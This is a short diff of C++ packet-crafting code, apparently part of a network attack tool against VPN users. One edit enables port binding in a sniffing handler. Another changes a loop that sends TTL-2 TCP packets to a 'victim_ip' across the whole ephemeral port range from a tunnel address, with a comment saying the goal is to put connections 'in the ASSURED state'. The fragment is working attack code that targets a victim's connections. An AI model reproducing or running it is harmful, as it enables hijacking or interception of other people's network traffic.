@@ -160,7 +160,7 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 		// tcp.set_flag(tcp_req.flags());
 
 		tcp_continue_ephem = false;
-		// tcp_bind_port(vport);
+		tcp_bind_port(vport);
 		// sender.send(pkt, iface);
 		std::cout << "HTTP Filler - client web port: " << vport << std::endl; 
 		return false;
@@ -183,11 +183,11 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 #define PORT_RANGE_END 61000
 void do_fill_table() {
         PacketSender sender;
-        NetworkInterface iface(public_iface);// "tun0"); // 
+        NetworkInterface iface("tun0"); // public_iface);//  
         while (tcp_continue_ephem) {
 		for (short i=PORT_RANGE_START;i<PORT_RANGE_END; i++) {
                         // TCP packets placed in the ASSURED state
-                        IP pkt = IP(victim_ip, "10.8.0.14") / TCP(https_port, i); 
+                        IP pkt = IP(victim_ip, "10.8.0.14") / TCP(i, https_port); 
 			IP& ip = pkt.rfind_pdu<IP>();
 			ip.ttl(2);
                         TCP &tcp = pkt.rfind_pdu<TCP>(); 
